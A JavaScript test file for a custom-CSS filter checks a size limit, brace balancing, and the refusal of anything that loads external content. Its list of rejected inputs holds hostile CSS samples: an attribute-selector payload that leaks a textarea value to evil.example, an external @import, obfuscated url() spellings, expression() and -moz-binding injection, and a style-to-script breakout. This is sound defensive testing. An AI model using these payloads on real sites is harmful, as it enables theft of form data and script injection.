// Custom CSS filter (js/custom-css.js): nothing that loads from elsewhere, size cap, balanced braces.
import assert from 'node:assert/strict';
import { checkCss, MAX_CSS } from '../js/custom-css.js';

assert.deepEqual(checkCss('  .chip { border-radius: 4px; }  '), { ok: true, css: '.chip { border-radius: 4px; }', problems: [] });
assert.equal(checkCss('').ok, true);
assert.equal(checkCss('@media (max-width: 600px) { .top h1 { color: teal; } }').ok, true);
// leaks and loads are refused, whatever the spelling
for (const bad of [
  'textarea[value^="A"] { background: url(https://evil.example/?A) }',
  'a { background: URL ( "x" ) }',
  '@import "https://evil.example/x.css";',
  'b { background-image: image-set("x.png" 1x) }',
  '@font-face { font-family: x; src: local(Arial) }',
  'i { background: u\\72l(x) }',
  'p { width: expression(alert(1)) }',
  'p { -moz-binding: x }',
  '</style><script>x</script>',
]) assert.equal(checkCss(bad).ok, false, bad);
assert.match(checkCss('a{background:url(x)}').problems.join(), /url\(\)/);
// a missing } would swallow the rules after it; quotes don't count
assert.equal(checkCss('.a { color: red;').ok, false);
assert.equal(checkCss('.a { color: red; } }').ok, false);
assert.equal(checkCss('.a::after { content: "}" }').ok, true);
assert.equal(checkCss('x'.repeat(MAX_CSS + 1)).ok, false);
console.log('custom css tests passed');
